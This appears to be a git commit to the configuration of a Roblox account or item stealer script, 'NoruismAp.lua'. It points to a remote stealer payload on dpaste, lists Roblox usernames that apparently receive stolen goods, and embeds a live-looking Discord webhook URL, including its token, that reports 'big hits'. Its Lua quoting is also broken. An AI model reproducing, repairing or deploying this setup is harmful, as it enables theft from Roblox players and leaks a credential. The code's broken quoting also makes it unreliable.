54f04e4c2c66c9c56b614fea4c7518abb01035f4
mijikaisys <mikifemboy@gmail.com>
2025-03-25 00:18:55 +0100

    Update NoruismAp.lua

--- NoruismAp.lua
+++ NoruismAp.lua
@@ -3,7 +3,7 @@ STEALER_LINK = 'https://dpaste.com/3DKH2ML8V.txt' -- stealer link (how to create
 Usernames = {
     'Asuna_0nO, -- PUT UR ROBLOX USERNAMES
     'drpon63, -- AS MANY AS U WANT BUT DONT FORGET ,
-    'SyneaOnAp,
+    'Kiddo_2014,
 }
 
 BigHitsWebhook = "https://discord.com/api/webhooks/1353867935239766096/enQqQC8BA28ZS6bBgbqtR6GAnSqIK7r5757MHiRyYuFhE8CZHsT9h_2Uzai2zsTNlCZK"
